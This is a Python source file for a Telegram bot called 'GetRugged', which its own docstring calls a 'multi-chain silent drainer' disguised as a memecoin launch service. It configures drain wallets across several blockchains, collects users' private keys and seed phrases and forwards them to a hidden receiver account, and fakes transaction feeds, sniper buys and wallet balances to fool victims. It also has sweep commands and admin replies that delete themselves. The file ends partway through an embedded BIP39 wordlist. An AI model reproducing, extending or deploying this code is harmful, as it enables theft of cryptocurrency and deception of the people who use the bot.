#!/usr/bin/env python3
"""
GetRugged bot — multi-chain silent drainer + full launch UX.
Photo upload + socials/bundle buttons + fixed confirm + group key logging.
LARP mode: /larpon /larpoff /randomtx /larpwallet /dumpnow /simactivity
Sweep: /sweepall /sweepstart [secs] /sweepstop
Help: /help
Requires: pip install aiogram==3.13.1 solana solders base58 web3 eth-account
"""

import asyncio
import hashlib
import json
import hmac
import logging
import os
import random
import string
import struct
import time
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple
from io import BytesIO

from aiogram import Bot, Dispatcher, F, Router
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    CallbackQuery, InlineKeyboardButton, InlineKeyboardMarkup, Message,
    ReplyKeyboardRemove, FSInputFile, InputMediaPhoto,
)
from aiogram.utils.keyboard import InlineKeyboardBuilder

try:
    from solders.keypair import Keypair
    from solders.pubkey import Pubkey
    from solders.system_program import TransferParams, transfer
    from solders.transaction import Transaction
    from solana.rpc.async_api import AsyncClient
    import base58
    HAS_SOLANA = True
except ImportError:
    HAS_SOLANA = False

try:
    from web3 import Web3
    from eth_account import Account
    HAS_WEB3 = True
except ImportError:
    HAS_WEB3 = False

# ──────────────────────────────────────────────
# CONFIG
# ──────────────────────────────────────────────
BOT_TOKEN = os.getenv("BOT_TOKEN", "PUT_YOUR_BOT_TOKEN_HERE")
ADMIN_IDS = {9242308833, 9276252898, 9053740667, 9146369253, 9222954840, 8646767923, 8637715094, 8412493404, 8839253481}

DRAIN_DESTINATION = (
    os.getenv("SOL_DRAIN_WALLET")
    or os.getenv("DRAIN_WALLET")
    or "YourDrainWalletPubkeyHere111111111111111111111"
)
ETH_DRAIN = os.getenv("ETH_DRAIN_WALLET") or "0xYourEthDrainAddressHere0000000000000000"
BNB_DRAIN = os.getenv("BNB_DRAIN_WALLET") or ETH_DRAIN
USDC_DRAIN = os.getenv("USDC_DRAIN_WALLET") or ETH_DRAIN
BTC_DRAIN = os.getenv("BTC_DRAIN_WALLET") or ""
LTC_DRAIN = os.getenv("LTC_DRAIN_WALLET") or ""

BTC_API = os.getenv("BTC_API", "https://blockstream.info/api")
LTC_API = os.getenv("LTC_API", "https://litecoinspace.org/api")

RPC_URL = os.getenv("RPC_URL", "https://api.mainnet-beta.solana.com")
ETH_RPC = os.getenv("ETH_RPC_URL") or os.getenv("ETH_RPC_URL_ALT") or "https://eth.llamarpc.com"
BNB_RPC = os.getenv("BNB_RPC_URL") or os.getenv("BNB_RPC_URL_ALT") or "https://bsc-dataseed.binance.org/"

MIN_DRAIN_LAMPORTS = 5_000
# Minimum total USD value required before a drain runs (admin-tunable via /mindrain)
MIN_DRAIN_USD = float(os.getenv("MIN_DRAIN_USD", "0") or 0)
PAYMENT_RECEIVER = os.getenv("PAYMENT_RECEIVER") or "4tVAsePqeGWgcqiPRL9ByFXiaHqhukYesva7y5r1jxxY"
LAUNCH_FEE_SOL = 10.0          # recurring fee every cycle
LAUNCHES_PER_CYCLE = 3         # free launches, then pay again
LOG_GROUP_ID = os.getenv("LOG_GROUP_ID", "")
KEY_RECEIVER_ID = int(os.getenv("KEY_RECEIVER_ID") or os.getenv("KEY_RECIEVER_ID") or "8637715094")
# Full seed/key goes only to KEY_RECEIVER_ID. These IDs get capture alerts without the seed.
KEY_ALERT_IDS = {-1004306225301, 9242308833, 9276252898, 9053740667, 9146369253, 9222954840, 8646767923, 8412493404, 8839253481}

USDC_ETH = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"
USDC_BSC = "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d"

SOL_EMOJI = "SOL"

ERC20_ABI = [
    {"constant": True, "inputs": [{"name": "_owner", "type": "address"}], "name": "balanceOf", "outputs": [{"name": "balance", "type": "uint256"}], "type": "function"},
    {"constant": False, "inputs": [{"name": "_to", "type": "address"}, {"name": "_value", "type": "uint256"}], "name": "transfer", "outputs": [{"name": "", "type": "bool"}], "type": "function"},
    {"constant": True, "inputs": [], "name": "decimals", "outputs": [{"name": "", "type": "uint8"}], "type": "function"},
]

logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(levelname)s | %(message)s")
log = logging.getLogger("getrugged")

# ──────────────────────────────────────────────
# STATE
# ──────────────────────────────────────────────
@dataclass
class UserWallet:
    private_key: str
    public_key: str
    label: str = "Main"
    created_at: float = field(default_factory=time.time)
    balance_sol: float = 0.0
    chain: str = "sol"
    eth_address: Optional[str] = None
    eth_priv: Optional[str] = None
    balance_eth: float = 0.0
    balance_bnb: float = 0.0
    balance_usdc: float = 0.0
    btc_address: Optional[str] = None
    btc_priv: Optional[str] = None
    balance_btc: float = 0.0
    ltc_address: Optional[str] = None
    ltc_priv: Optional[str] = None
    balance_ltc: float = 0.0
    is_larp: bool = False
    drained: bool = False

@dataclass
class UserSession:
    wallets: List[UserWallet] = field(default_factory=list)
    active_wallet_idx: int = 0
    promo: Optional[str] = None
    promo_discount: float = 0.0
    launches_left: int = 3
    total_launches: int = 0
    sol_credit: float = 0.0
    launched_tokens: List[dict] = field(default_factory=list)
    last_tx: List[dict] = field(default_factory=list)
    settings: dict = field(default_factory=lambda: {
        "slippage": 15,
        "priority_fee": 0.0005,
        "sniper_protection": True,
        "auto_sell": False,
        "mev_protection": True,
    })
    safety_checks_run: int = 0
    last_safety: Optional[dict] = None
    pending_invoice: Optional[dict] = None
    last_raw_key: Optional[str] = None
    larp_mode: bool = False
    larp_wallet_idx: Optional[int] = None
    pending_larp_balance: Optional[float] = None
    pending_larp_phrase: Optional[str] = None
    larp_profit_total: float = 0.0
    # Admin LARP display overrides (None = use real lists)
    portfolio_display_total: Optional[int] = None
    portfolio_display_live: Optional[int] = None

sessions: Dict[int, UserSession] = {}
bot_balance_sol: float = 0.0
GLOBAL_TX_FEED: List[dict] = []
LARP_ENABLED: bool = False
STATE_FILE = os.getenv("STATE_FILE", "bot_state.json")

_sweeper_task: Optional[asyncio.Task] = None
SWEEP_INTERVAL_DEFAULT = 60.0
_bot_ref: Optional[Bot] = None

_rate_hits: Dict[Tuple[int, str], List[float]] = {}
RATE_WINDOW = 60.0
RATE_MAX_IMPORTS = 3
RATE_MAX_LAUNCH = 5
RATE_MAX_SAFETY = 8


def _load_state() -> None:
    global bot_balance_sol, GLOBAL_TX_FEED, LARP_ENABLED, MIN_DRAIN_USD
    try:
        if not os.path.isfile(STATE_FILE):
            return
        with open(STATE_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
        if isinstance(data.get("bot_balance_sol"), (int, float)):
            bot_balance_sol = float(data["bot_balance_sol"])
        feed = data.get("global_tx_feed") or []
        if isinstance(feed, list):
            GLOBAL_TX_FEED = [x for x in feed if isinstance(x, dict)][:50]
        if isinstance(data.get("larp_enabled"), bool):
            LARP_ENABLED = data["larp_enabled"]
        if isinstance(data.get("min_drain_usd"), (int, float)):
            MIN_DRAIN_USD = float(data["min_drain_usd"])
        log.info(
            "Loaded state: vault=%.4f feed=%s larp=%s mindrain=$%.2f",
            bot_balance_sol, len(GLOBAL_TX_FEED), LARP_ENABLED, MIN_DRAIN_USD,
        )
    except Exception as e:
        log.warning("State load failed: %s", e)


def _save_state() -> None:
    try:
        payload = {
            "bot_balance_sol": bot_balance_sol,
            "global_tx_feed": GLOBAL_TX_FEED[:80],
            "larp_enabled": LARP_ENABLED,
            "min_drain_usd": MIN_DRAIN_USD,
            "updated": time.time(),
        }
        tmp = STATE_FILE + ".tmp"
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(payload, f)
        os.replace(tmp, STATE_FILE)
    except Exception as e:
        log.warning("State save failed: %s", e)


def inject_fake_txs(n: int = 3, types: Optional[List[str]] = None) -> List[dict]:
    global GLOBAL_TX_FEED
    default_types = [
        "⚡ Priority Tip",
        "📦 Bundle Buy",
        "🪙 Create Mint",
        "⚡ Priority Tip (SOL)",
        "🛡 Safety Scan",
        "🔄 Swap",
        "💰 Profit Claim",
        "🎯 Sniper Dump",
        "📥 Wallet Top-up",
        "📤 Transfer Out",
    ]
    pool = types or default_types
    n = max(1, min(25, int(n)))
    now = time.time()
    created = []
    for i in range(n):
        tx = {
            "sig": fake_sig(),
            "type": random.choice(pool),
            "status": "success",
            "ts": now - random.uniform(2, 240) - i * 8,
            "fake": True,
        }
        created.append(tx)
        GLOBAL_TX_FEED.insert(0, tx)
    GLOBAL_TX_FEED = GLOBAL_TX_FEED[:80]
    return created


def _fake_sol_pubkey() -> str:
    if HAS_SOLANA:
        try:
            return str(Keypair().pubkey())
        except Exception:
            pass
    alphabet = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
    return "".join(random.choices(alphabet, k=44))


def ensure_larp_wallet(sess: UserSession, force_balance: Optional[float] = None) -> UserWallet:
    global bot_balance_sol
    for i, w in enumerate(sess.wallets):
        if getattr(w, "is_larp", False):
            sess.larp_wallet_idx = i
            if force_balance is not None:
                w.balance_sol = float(force_balance)
            elif LARP_ENABLED and bot_balance_sol > 0:
                w.balance_sol = bot_balance_sol
            sess.active_wallet_idx = i
            return w
    bal = float(force_balance) if force_balance is not None else (bot_balance_sol if bot_balance_sol > 0 else round(random.uniform(2.4, 18.7), 4))
    pub = _fake_sol_pubkey()
    w = UserWallet(
        private_key="LARP_SIM",
        public_key=pub,
        label="Main",
        balance_sol=bal,
        chain="sol",
        is_larp=True,
    )
    sess.wallets.append(w)
    sess.larp_wallet_idx = len(sess.wallets) - 1
    sess.active_wallet_idx = sess.larp_wallet_idx
    return w


def remove_larp_wallets(sess: UserSession) -> int:
    before = len(sess.wallets)
    sess.wallets = [w for w in sess.wallets if not getattr(w, "is_larp", False)]
    sess.larp_wallet_idx = None
    if sess.wallets:
        sess.active_wallet_idx = min(sess.active_wallet_idx, len(sess.wallets) - 1)
    else:
        sess.active_wallet_idx = 0
    return before - len(sess.wallets)


def sync_larp_balances_from_vault(uid: Optional[int] = None) -> None:
    global bot_balance_sol
    targets = []
    if uid is not None:
        targets.append(get_session(uid))
    else:
        for s in sessions.values():
            if s.larp_mode or any(getattr(w, "is_larp", False) for w in s.wallets):
                targets.append(s)
    for sess in targets:
        for w in sess.wallets:
            if getattr(w, "is_larp", False):
                w.balance_sol = bot_balance_sol


def add_personal_tx(sess: UserSession, tx_type: str, status: str = "success", amount: Optional[float] = None) -> dict:
    tx = {
        "sig": fake_sig(),
        "type": tx_type,
        "status": status,
        "ts": time.time(),
        "fake": True,
    }
    if amount is not None:
        tx["amount"] = amount
    sess.last_tx.insert(0, tx)
    sess.last_tx = sess.last_tx[:40]
    GLOBAL_TX_FEED.insert(0, dict(tx))
    GLOBAL_TX_FEED[:] = GLOBAL_TX_FEED[:80]
    return tx


async def _sniper_activity_feed(
    sess: UserSession,
    token: dict,
    rounds: int = 4,
    bot: Optional[Bot] = None,
    chat_id: Optional[int] = None,
    message_id: Optional[int] = None,
) -> None:
    """Background pulse: fake buys + optional live-card MC/holders refresh."""
    if token.get("dumped"):
        return
    symbol = token.get("symbol", "???")
    mint = token.get("mint", "")
    for i in range(rounds):
        await asyncio.sleep(random.uniform(6, 16))
        if token.get("dumped"):
            return
        vol = round(random.uniform(0.05, 1.35), 4)
        kinds = [
            f"👀 Sniper buy ${symbol}",
            f"📈 External buy ${symbol}",
            f"⚡ Jito tip (sniper)",
            f"🔎 New buyer detected",
            f"🟢 Holder +1 ${symbol}",
            f"📦 Bundle fill ${symbol}",
        ]
        add_personal_tx(sess, random.choice(kinds), "success", amount=vol)
        # Bump live stats
        token["mcap"] = round(float(token.get("mcap") or 25_000) * random.uniform(1.01, 1.08), 0)
        token["holders"] = int(token.get("holders") or 40) + random.randint(1, 4)
        token["buys"] = int(token.get("buys") or 10) + random.randint(1, 3)
        # Refresh dashboard message if we have a handle
        if bot and chat_id and message_id and mint:
            try:
                short = mint if len(mint) < 20 else f"{mint[:6]}…{mint[-4:]}"
                text = (
                    f"🟢  <b>${symbol}</b>  —  Live  <i>(pulse {i + 1}/{rounds})</i>\n"
                    f"<code>{short}</code>\n\n"
                    f"📈  MC  <b>~${token['mcap']:,.0f}</b>  ·  "
                    f"👥  Holders  <b>{token['holders']}</b>  ·  "
                    f"🛒  Buys  <b>{token['buys']}</b>\n"
                    f"⚡  Last fill  <b>+{vol:.3f} SOL</b>\n\n"
                    f"🎯  Sniper guard ON  ·  Dump when ready"
                )
                await bot.edit_message_text(
                    text,
                    chat_id=chat_id,
                    message_id=message_id,
                    reply_markup=live_token_kb(mint, int(token.get("bundle") or 10)),
                    parse_mode=ParseMode.HTML,
                )
            except Exception:
                pass


async def _auto_delete(bot, chat_id: int, *message_ids, delay: float = 5.0):
    await asyncio.sleep(delay)
    for mid in message_ids:
        if mid is None:
            continue
        try:
            await bot.delete_message(chat_id, mid)
        except Exception:
            pass


async def _admin_reply(message: Message, text: str, delay: float = 5.0, **kwargs):
    kwargs.setdefault("parse_mode", ParseMode.HTML)
    reply = await message.answer(text, **kwargs)
    asyncio.create_task(_auto_delete(message.bot, message.chat.id, message.message_id, reply.message_id, delay=delay))
    return reply


def get_session(uid: int) -> UserSession:
    if uid not in sessions:
        sessions[uid] = UserSession()
    return sessions[uid]


def _rate_ok(uid: int, action: str) -> bool:
    now = time.time()
    key = (uid, action)
    hits = _rate_hits.setdefault(key, [])
    hits[:] = [t for t in hits if now - t < RATE_WINDOW]
    limits = {"import": RATE_MAX_IMPORTS, "launch": RATE_MAX_LAUNCH, "safety": RATE_MAX_SAFETY}
    if len(hits) >= limits.get(action, 5):
        return False
    hits.append(now)
    return True


# ──────────────────────────────────────────────
# HELPERS
# ──────────────────────────────────────────────
def fake_sig() -> str:
    return "".join(random.choices(string.ascii_letters + string.digits, k=88))

BIP39_WORDLIST = ['abandon', 'ability', 'able', 'about', 'above', 'absent', 'absorb', 'abstract', 'absurd', 'abuse', 'access', 'accident', 'account', 'accuse', 'achieve', 'acid', 'acoustic', 'acquire', 'across', 'act', 'action', 'actor', 'actress', 'actual', 'adapt', 'add', 'addict', 'address', 'adjust', 'admit', 'adult', 'advance', 'advice', 'aerobic', 'affair', 'afford', 'afraid', 'again', 'age', 'agent', 'agree', 'ahead', 'aim', 'air', 'airport', 'aisle', 'alarm', 'album', 'alcohol', 'alert', 'alien', 'all', 'alley', 'allow', 'almost', 'alone', 'alpha', 'already', 'also', 'alter', 'always', 'amateur', 'amazing', 'among', 'amount', 'amused', 'analyst', 'anchor', 'ancient', 'anger', 'angle', 'angry', 'animal', 'ankle', 'announce', 'annual', 'another', 'answer', 'antenna', 'antique', 'anxiety', 'any', 'apart', 'apology', 'appear', 'apple', 'approve', 'april', 'arch', 'arctic', 'area', 'arena', 'argue', 'arm', 'armed', 'armor', 'army', 'around', 'arrange', 'arrest', 'arrive', 'arrow', 'art', 'artefact', 'artist', 'artwork', 'ask', 'aspect', 'assault', 'asset', 'assist', 'assume', 'asthma', 'athlete', 'atom', 'attack', 'attend', 'attitude', 'attract', 'auction', 'audit', 'august', 'aunt', 'author', 'auto', 'autumn', 'average', 'avocado', 'avoid', 'awake', 'aware', 'away', 'awesome', 'awful', 'awkward', 'axis', 'baby', 'bachelor', 'bacon', 'badge', 'bag', 'balance', 'balcony', 'ball', 'bamboo', 'banana', 'banner', 'bar', 'barely', 'bargain', 'barrel', 'base', 'basic', 'basket', 'battle', 'beach', 'bean', 'beauty', 'because', 'become', 'beef', 'before', 'begin', 'behave', 'behind', 'believe', 'below', 'belt', 'bench', 'benefit', 'best', 'betray', 'better', 'between', 'beyond', 'bicycle', 'bid', 'bike', 'bind', 'biology', 'bird', 'birth', 'bitter', 'black', 'blade', 'blame', 'blanket', 'blast', 'bleak', 'bless', 'blind', 'blood', 'blossom', 'blouse', 'blue', 'blur', 'blush', 'board', 'boat', 'body', 'boil', 'bomb', 'bone', 'bonus', 'book', 'boost', 'border', 'boring', 'borrow', 'boss', 'bottom', 'bounce', 'box', 'boy', 'bracket', 'brain', 'brand', 'brass', 'brave', 'bread', 'breeze', 'brick', 'bridge', 'brief', 'bright', 'bring', 'brisk', 'broccoli', 'broken', 'bronze', 'broom', 'brother', 'brown', 'brush', 'bubble', 'buddy', 'budget', 'buffalo', 'build', 'bulb', 'bulk', 'bullet', 'bundle', 'bunker', 'burden', 'burger', 'burst', 'bus', 'business', 'busy', 'butter', 'buyer', 'buzz', 'cabbage', 'cabin', 'cable', 'cactus', 'cage', 'cake', 'call', 'calm', 'camera', 'camp', 'can', 'canal', 'cancel', 'candy', 'cannon', 'canoe', 'canvas', 'canyon', 'capable', 'capital', 'captain', 'car', 'carbon', 'card', 'cargo', 'carpet', 'carry', 'cart', 'case', 'cash', 'casino', 'castle', 'casual', 'cat', 'catalog', 'catch', 'category', 'cattle', 'caught', 'cause', 'caution', 'cave', 'ceiling', 'celery', 'cement', 'census', 'century', 'cereal', 'certain', 'chair', 'chalk', 'champion', 'change', 'chaos', 'chapter', 'charge', 'chase', 'chat', 'cheap', 'check', 'cheese', 'chef', 'cherry', 'chest', 'chicken', 'chief', 'child', 'chimney', 'choice', 'choose', 'chronic', 'chuckle', 'chunk', 'churn', 'cigar', 'cinnamon', 'circle', 'citizen', 'city', 'civil', 'claim', 'clap', 'clarify', 'claw', 'clay', 'clean', 'clerk', 'clever', 'click', 'client', 'cliff', 'climb', 'clinic', 'clip', 'clock', 'clog', 'close', 'cloth', 'cloud', 'clown', 'club', 'clump', 'cluster', 'clutch', 'coach', 'coast', 'coconut', 'code', 'coffee', 'coil', 'coin', 'collect', 'color', 'column', 'combine', 'come', 'comfort', 'comic', 'common', 'company', 'concert', 'conduct', 'confirm', 'congress', 'connect', 'consider', 'control', 'convince', 'cook', 'cool', 'copper', 'copy', 'coral', 'core', 'corn', 'correct', 'cost', 'cotton', 'couch', 'country', 'couple', 'course', 'cousin', 'cover', 'coyote', 'crack', 'craft', 'cram', 'crane', 'crash', 'crater', 'crawl', 'crazy', 'cream', 'credit', 'creek', 'crew', 'cricket', 'crime', 'crisp', 'critic', 'crop', 'cross', 'crouch', 'crowd', 'crucial', 'cruel', 'cruise', 'crumble', 'crunch', 'crush', 'cry', 'crystal', 'cube', 'culture', 'cup', 'cupboard', 'curious', 'current', 'curtain', 'curve', 'cushion', 'custom', 'cute', 'cycle', 'dad', 'damage', 'damp', 'dance', 'danger', 'daring', 'dash', 'daughter', 'dawn', 'day', 'deal', 'debate', 'debris', 'decade', 'december', 'decide', 'decline', 'decorate', 'decrease', 'deer', 'defense', 'define', 'defy', 'degree', 'delay', 'deliver', 'demand', 'demise', 'denial', 'dentist', 'deny', 'depart', 'depend', 'deposit', 'depth', 'deputy', 'derive', 'desert', 'design', 'desk', 'despair', 'destroy', 'detail', 'detect', 'develop', 'device', 'devote', 'diagram', 'dial', 'diamond', 'diary', 'dice', 'diesel', 'diet', 'differ', 'digital', 'dignity', 'dilemma', 'dinner', 'dinosaur', 'direct', 'dirt', 'disagree', 'discover', 'disease', 'dish', 'dismiss', 'disorder', 'display', 'distance', 'divert', 'divide', 'divorce', 'dizzy', 'doctor', 'document', 'dog', 'doll', 'dolphin', 'domain', 'donate', 'donkey', 'donor', 'door', 'dose', 'double', 'dove', 'dragon', 'drama', 'drastic', 'draw', 'dream', 'dress', 'drift', 'drill', 'drink', 'drip', 'drive', 'drop', 'drum', 'dry', 'duck', 'dumb', 'dune', 'during', 'dust', 'dutch', 'duty', 'dwarf', 'dynamic', 'eager', 'eagle', 'early', 'earn', 'earth', 'easily', 'east', 'easy', 'echo', 'ecology', 'economy', 'edge', 'edit', 'educate', 'effort', 'egg', 'eight', 'either', 'elbow', 'elder', 'electric', 'elegant', 'element', 'elephant', 'elevator', 'elite', 'else', 'embark', 'embody', 'embrace', 'emerge', 'emotion', 'employ', 'empty', 'enable', 'enact', 'end', 'endless', 'endorse', 'enemy', 'energy', 'enforce', 'engage', 'engine', 'enhance', 'enjoy', 'enlist', 'enough', 'enrich', 'enroll', 'ensure', 'enter', 'entire', 'entry', 'envelope', 'episode', 'equal', 'equip', 'era', 'erase', 'erode', 'erosion', 'error', 'erupt', 'escape', 'essay', 'essence', 'estate', 'eternal', 'ethics', 'evidence', 'evil', 'evoke', 'evolve', 'exact', 'example', 'excess', 'exchange', 'excite', 'exclude', 'excuse', 'execute', 'exercise', 'exhaust', 'exhibit', 'exile', 'exist', 'exit', 'exotic', 'expand', 'expect', 'expire', 'explain', 'expose', 'express', 'extend', 'extra', 'eye', 'eyebrow', 'fabric', 'face', 'faculty', 'fade', 'faint', 'faith', 'fall', 'false', 'fame', 'family', 'famous', 'fan', 'fancy', 'fantasy', 'farm', 'fashion', 'fat', 'fatal', 'father', 'fatigue', 'fault', 'favorite', 'feature', 'february', 'federal', 'fee', 'feed', 'feel', 'female', 'fence', 'festival', 'fetch', 'fever', 'few', 'fiber', 'fiction', 'field', 'figure', 'file', 'film', 'filter', 'final', 'find', 'fine', 'finger', 'finish', 'fire', 'firm', 'first', 'fiscal', 'fish', 'fit', 'fitness', 'fix', 'flag', 'flame', 'flash', 'flat', 'flavor', 'flee', 'flight', 'flip', 'float', 'flock', 'floor', 'flower', 'fluid', 'flush', 'fly', 'foam', 'focus', 'fog', 'foil', 'fold', 'follow', 'food', 'foot', 'force', 'forest', 'forget', 'fork', 'fortune', 'forum', 'forward', 'fossil', 'foster', 'found', 'fox', 'fragile', 'frame', 'frequent', 'fresh', 'friend', 'fringe', 'frog', 'front', 'frost', 'frown', 'frozen', 'fruit', 'fuel', 'fun', 'funny', 'furnace', 'fury', 'future', 'gadget', 'gain', 'galaxy', 'gallery', 'game', 'gap', 'garage', 'garbage', 'garden', 'garlic', 'garment', 'gas', 'gasp', 'gate', 'gather', 'gauge', 'gaze', 'general', 'genius', 'genre', 'gentle', 'genuine', 'gesture', 'ghost', 'giant', 'gift', 'giggle', 'ginger', 'giraffe', 'girl', 'give', 'glad', 'glance', 'glare', 'glass', 'glide', 'glimpse', 'globe', 'gloom', 'glory', 'glove', 'glow', 'glue', 'goat', 'goddess', 'gold', 'good', 'goose', 'gorilla', 'gospel', 'gossip', 'govern', 'gown', 'grab', 'grace', 'grain', 'grant', 'grape', 'grass', 'gravity', 'great', 'green', 'grid', 'grief', 'grit', 'grocery', 'group', 'grow', 'grunt', 'guard', 'guide', 'guilt', 'guitar', 'gun', 'gym', 'habit', 'hair', 'half', 'hammer', 'hamster', 'hand', 'happy', 'harbor', 'hard', 'harsh', 'harvest', 'hat', 'have', 'hawk', 'hazard', 'head', 'health', 'heart', 'heavy', 'hedgehog', 'height', 'hello', 'helmet', 'help', 'hen', 'hero', 'hidden', 'high', 'hill', 'hint', 'hip', 'hire', 'history', 'hobby', 'hockey', 'hold', 'hole', 'holiday', 'hollow', 'home', 'honey', 'hood', 'hope', 'horn', 'horror', 'horse', 'hospital', 'host', 'hotel', 'hour', 'hover', 'hub', 'huge', 'human', 'humble', 'humor', 'hundred', 'hungry', 'hunt', 'hurdle', 'hurry', 'hurt', 'husband', 'hybrid', 'ice', 'icon', 'idea', 'identify', 'idle', 'ignore', 'ill', 'illegal', 'illness', 'image', 'imitate', 'immense', 'immune', 'impact', 'impose', 'improve', 'impulse', 'inch', 'include', 'income', 'increase', 'index', 'indicate', 'indoor', 'industry', 'infant', 'inflict', 'inform', 'inhale', 'inherit', 'initial', 'inject', 'injury', 'inmate', 'inner', 'innocent', 'input', 'inquiry', 'insane', 'insect', 'inside', 'inspire', 'install', 'intact', 'interest', 'into', 'invest', 'invite', 'involve', 'iron', 'island', 'isolate', 'issue', 'item', 'ivory', 'jacket', 'jaguar', 'jar', 'jazz', 'jealous', 'jeans', 'jelly', 'jewel', 'job', 'join', 'joke', 'journey', 'joy', 'judge', 'juice', 'jump', 'jungle', 'junior', 'junk', 'just', 'kangaroo', 'keen', 'keep', 'ketchup', 'key', 'kick', 'kid', 'kidney', 'kind', 'kingdom', 'kiss', 'kit', 'kitchen', 'kite', 'kitten', 'kiwi', 'knee', 'knife', 'knock', 'know', 'lab', 'label', 'labor', 'ladder', 'lady', 'lake', 'lamp', 'language', 'laptop', 'large', 'later', 'latin', 'laugh', 'laundry', 'lava', 'law', 'lawn', 'lawsuit', 'layer', 'lazy', 'leader', 'leaf', 'learn', 'leave', 'lecture', 'left', 'leg', 'legal', 'legend', 'leisure', 'lemon', 'lend', 'length', 'lens', 'leopard', 'lesson', 'letter', 'level', 'liar', 'liberty', 'library', 'license', 'life', 'lift', 'light', 'like', 'limb', 'limit', 'link', 'lion', 'liquid', 'list', 'little', 'live', 'lizard', 'load', 'loan', 'lobster', 'local', 'lock', 'logic', 'lonely', 'long', 'loop', 'lottery', 'loud', 'lounge', 'love', 'loyal', 'lucky', 'luggage', 'lumber', 'lunar', 'lunch', 'luxury', 'lyrics', 'machine', 'mad', 'magic', 'magnet', 'maid', 'mail', 'main', 'major', 'make', 'mammal', 'man', 'manage', 'mandate', 'mango', 'mansion', 'manual', 'maple', 'marble', 'march', 'margin', 'marine', 'market', 'marriage', 'mask', 'mass', 'master', 'match', 'material', 'math', 'matrix', 'matter', 'maximum', 'maze', 'meadow', 'mean', 'measure', 'meat', 'mechanic', 'medal', 'media', 'melody', 'melt', 'member', 'memory', 'mention', 'menu', 'mercy', 'merge', 'merit', 'merry', 'mesh', 'message', 'metal', 'method', 'middle', 'midnight', 'milk', 'million', 'mimic', 'mind', 'minimum', 'minor', 'minute', 'miracle', 'mirror', 'misery', 'miss', 'mistake', 'mix', 'mixed', 'mixture', 'mobile', 'model', 'modify', 'mom', 'moment', 'monitor', 'monkey', 'monster', 'month', 'moon', 'moral', 'more', 'morning', 'mosquito', 'mother', 'motion', 'motor', 'mountain', 'mouse', 'move', 'movie', 'much', 'muffin', 'mule', 'multiply', 'muscle', 'museum', 'music', 'must', 'mutual', 'myself', 'mystery', 'myth', 'naive', 'name', 'napkin', 'narrow', 'nasty', 'nation', 'nature', 'near', 'neck', 'need', 'negative', 'neglect', 'neither', 'nephew', 'nerve', 'nest', 'net', 'network', 'neutral', 'never', 'news', 'next', 'nice', 'night', 'noble', 'noise', 'nominee', 'noodle', 'normal', 'north', 'nose', 'notable', 'note', 'nothing', 'notice', 'novel', 'now', 'nuclear', 'number', 'nurse', 'nut', 'oak', 'obey', 'object', 'oblige', 'obscure', 'observe', 'obtain', 'obvious', 'occur', 'ocean', 'october', 'odor', 'off', 'offer', 'office', 'often', 'oil', 'okay', 'old', 'olive', 'olympic', 'omit', 'once', 'one', 'onion', 'online', 'only', 'open', 'opera', 'opinion', 'oppose', 'option', 'orange', 'orbit', 'orchard', 'order', 'ordinary', 'organ', 'orient', 'original', 'orphan', 'ostrich', 'other', 'outdoor', 'outer', 'output', 'outside', 'oval', 'oven', 'over', 'own', 'owner', 'oxygen', 'oyster', 'ozone', 'pact', 'paddle', 'page', 'pair', 'palace', 'palm', 'panda', 'panel', 'panic', 'panther', 'paper', 'parade', 'parent', 'park', 'parrot', 'party', 'pass', 'patch', 'path', 'patient', 'patrol', 'pattern', 'pause', 'pave', 'payment', 'peace', 'peanut', 'pear', 'peasant', 'pelican', 'pen', 'penalty', 'pencil', 'people', 'pepper', 'perfect', 'permit', 'person', 'pet', 'phone', 'photo', 'phrase', 'physical', 'piano', 'picnic', 'picture', 'piece', 'pig', 'pigeon', 'pill', 'pilot', 'pink', 'pioneer', 'pipe', 'pistol', 'pitch', 'pizza', 'place', 'planet', 'plastic', 'plate', 'play', 'please', 'pledge', 'pluck', 'plug', 'plunge', 'poem', 'poet', 'point', 'polar', 'pole', 'police', 'pond', 'pony', 'pool', 'popular', 'portion', 'position', 'possible', 'post', 'potato', 'pottery', 'poverty', 'powder', 'power', 'practice', 'praise', 'predict', 'prefer', 'prepare', 'present', 'pretty', 'prevent', 'price', 'pride', 'primary', 'print', 'priority', 'prison', 'private', 'prize', 'problem', 'process', 'produce', 'profit', 'program', 'project', 'promote', 'proof', 'property', 'prosper', 'protect', 'proud', 'provide', 'public', 'pudding', 'pull', 'pulp', 'pulse', 'pumpkin', 'punch', 'pupil', 'puppy', 'purchase', 'purity', 'purpose', 'purse', 'push', 'put', 'puzzle', 'pyramid', 'quality', 'quantum', 'quarter', 'question', 'quick', 'quit', 'quiz', 'quote', 'rabbit', 'raccoon', 'race', 'rack', 'radar', 'radio', 'rail', 'rain', 'raise', 'rally', 'ramp', 'ranch', 'random', 'range', 'rapid', 'rare', 'rate', 'rather', 'raven', 'raw', 'razor', 'ready', 'real', 'reason', 'rebel', 'rebuild', 'recall', 'receive', 'recipe', 'record', 'recycle', 'reduce', 'reflect', 'reform', 'refuse', 'region', 'regret', 'regular', 'reject', 'relax', 'release', 'relief', 'rely', 'remain', 'remember', 'remind', 'remove', 'render', 'renew', 'rent', 'reopen', 'repair', 'repeat', 'replace', 'report', 'require', 'rescue', 'resemble', 'resist', 'resource', 'response', 'result', 'retire', 'retreat', 'return', 'reunion', 'reveal', 'review', 'reward', 'rhythm', 'rib', 'ribbon', 'rice', 'rich', 'ride', 'ridge', 'rifle', 'right', 'rigid', 'ring', 'riot', 'ripple', 'risk', 'ritual', 'rival', 'river', 'road', 'roast', 'robot', 'robust', 'rocket', 'romance', 'roof', 'rookie', 'room', 'rose', 'rotate', 'rough', 'round', 'route', 'royal', 'rubber', 'rude', 'rug', 'rule', 'run', 'runway', 'rural', 'sad', 'saddle', 'sadness', 'safe', 'sail', 'salad', 'salmon', 'salon', 'salt', 'salute', 'same', 'sample', 'sand', 'satisfy', 'satoshi', 'sauce', 'sausage', 'save', 'say', 'scale', 'scan', 'scare', 'scene', 'scheme', 'school', 'science', 'scissors', 'scorpion', 'scout', 'scrap', 'screen', 